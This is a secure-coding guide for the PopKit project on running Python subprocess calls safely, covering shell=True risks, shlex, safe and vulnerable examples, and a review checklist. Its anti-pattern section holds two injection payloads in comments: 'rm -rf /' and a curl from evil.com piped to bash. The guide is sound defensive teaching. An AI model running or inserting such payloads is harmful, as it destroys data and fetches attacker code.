# Subprocess Best Practices for PopKit

## Quick Decision Tree

```
┌─────────────────────────────────────┐
│ Need to run a system command?      │
└─────────────────┬───────────────────┘
                  │
                  ▼
         ┌────────────────────┐
         │ Does it use pipes, │
         │ redirection, or    │──── YES ──┐
         │ shell wildcards?   │           │
         └────────┬───────────┘           │
                  │                       │
                  NO                      │
                  │                       │
                  ▼                       ▼
    ┌──────────────────────┐   ┌──────────────────────┐
    │ Use shlex.split()    │   │ Use shell=True       │
    │ shell=False          │   │ BUT DOCUMENT WHY     │
    │ (SAFE)               │   │ (CONTROLLED RISK)    │
    └──────────────────────┘   └──────────────────────┘
```

## The Safe Pattern

```python
import subprocess
import shlex

def run_command(cmd: str, use_shell: bool = False) -> str:
    """
    Run command and return output.

    Args:
        cmd: Command string
        use_shell: True if command needs shell features (pipes, redirection)
    """
    try:
        if use_shell:
            # Only use shell=True when needed for pipes/redirection
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
        else:
            # Safe list-based execution (default)
            result = subprocess.run(
                shlex.split(cmd),
                capture_output=True,
                text=True,
                timeout=10
            )
        return result.stdout.strip()
    except Exception as e:
        # Handle errors appropriately
        return ""

# Usage
branch = run_command('git rev-parse --abbrev-ref HEAD')  # Safe
stashes = run_command('git stash list | wc -l', use_shell=True)  # Justified
```

## Common Commands Reference

### ✅ SAFE (No shell=True needed)

```python
# Git commands
run_command('git status --porcelain')
run_command('git rev-parse --abbrev-ref HEAD')
run_command('git fetch --quiet')
run_command(f'git rev-list --count HEAD..origin/{branch}')  # Variables OK with shlex

# GitHub CLI
run_command('gh pr list --state open --json number,title')
run_command('gh issue list --state open --json number,assignees')
run_command('gh run list --limit 1 --json conclusion,status')

# Package managers
run_command('npm audit --json')
run_command('pnpm list --depth 0')
```

### ⚠️ REQUIRES shell=True (Must document why)

```python
# Pipes
run_command('git stash list | wc -l', use_shell=True)
# Why: Pipe operator | requires shell

run_command('ps aux | grep node | grep -v grep', use_shell=True)
# Why: Multiple pipes require shell

# Redirection
run_command('pnpm outdated --json 2>/dev/null', use_shell=True)
# Why: stderr redirection requires shell

run_command('ls ~/.claude/logs/*.log 2>/dev/null | wc -l', use_shell=True)
# Why: Both redirection and pipe require shell

# Shell wildcards
run_command('ls *.py', use_shell=True)
# Why: Glob expansion requires shell
# Better: Use Path.glob() instead!
```

## Anti-Patterns (NEVER DO THIS)

```python
# ❌ VULNERABLE: User input with shell=True
def delete_branch(branch_name: str):
    subprocess.run(f'git branch -D {branch_name}', shell=True)  # INJECTION RISK!
    # Attack: branch_name = "main; rm -rf /"

# ✅ SAFE: Use list args
def delete_branch(branch_name: str):
    subprocess.run(['git', 'branch', '-D', branch_name])

# ❌ VULNERABLE: Unsanitized paths
def backup_file(filepath: str):
    subprocess.run(f'cp {filepath} backup/', shell=True)  # INJECTION RISK!
    # Attack: filepath = "file.txt; curl evil.com/malware | bash"

# ✅ SAFE: Use list args
def backup_file(filepath: str):
    subprocess.run(['cp', filepath, 'backup/'])
```

## When You Can't Avoid shell=True

If you MUST use `shell=True`, follow these rules:

1. **Document why** with an inline comment
2. **Never use user input** directly in the command
3. **Sanitize inputs** if you must include variables
4. **Set timeout** to prevent hanging
5. **Consider alternatives** (Python libraries vs. shell commands)

```python
# Good example
def count_log_files():
    # Uses shell for glob expansion - no user input
    cmd = 'ls ~/.claude/logs/*.log 2>/dev/null | wc -l'
    result = subprocess.run(
        cmd,
        shell=True,  # Needed for pipe and glob
        capture_output=True,
        text=True,
        timeout=5
    )
    return int(result.stdout.strip() or '0')

# Better alternative (no shell needed!)
from pathlib import Path

def count_log_files():
    log_dir = Path.home() / '.claude' / 'logs'
    return len(list(log_dir.glob('*.log'))) if log_dir.exists() else 0
```

## Python Alternatives to Shell Commands

Instead of calling shell commands, consider Python alternatives:

| Shell Command | Python Alternative |
|---------------|-------------------|
| `ls *.py` | `Path().glob('*.py')` |
| `wc -l file.txt` | `len(Path('file.txt').read_text().splitlines())` |
| `which command` | `shutil.which('command')` |
| `grep pattern file` | `re.findall(pattern, text)` |
| `cat file1 file2` | `Path('file1').read_text() + Path('file2').read_text()` |
| `ps aux \| grep node` | `psutil.process_iter(['name', 'cmdline'])` |

## Code Review Checklist

When reviewing code with subprocess calls:

- [ ] Does it use `shell=True`?
- [ ] If yes, is it justified with a comment?
- [ ] If yes, does it use any user input?
- [ ] Could it be rewritten with `shlex.split()`?
- [ ] Could it be replaced with a Python library?
- [ ] Is there a timeout set?
- [ ] Are errors handled appropriately?

## Tools

```bash
# Find all subprocess calls with shell=True
rg "subprocess\.(run|Popen).*shell=True" --type py

# Find subprocess calls that might need review
rg "subprocess\.(run|Popen)" --type py -A 5 | rg -B 5 "shell="
```

## References

- [Python subprocess documentation](https://docs.python.org/3/library/subprocess.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [Python shlex module](https://docs.python.org/3/library/shlex.html)

## Version History

- **2025-12-30:** Initial version created for Issue #214
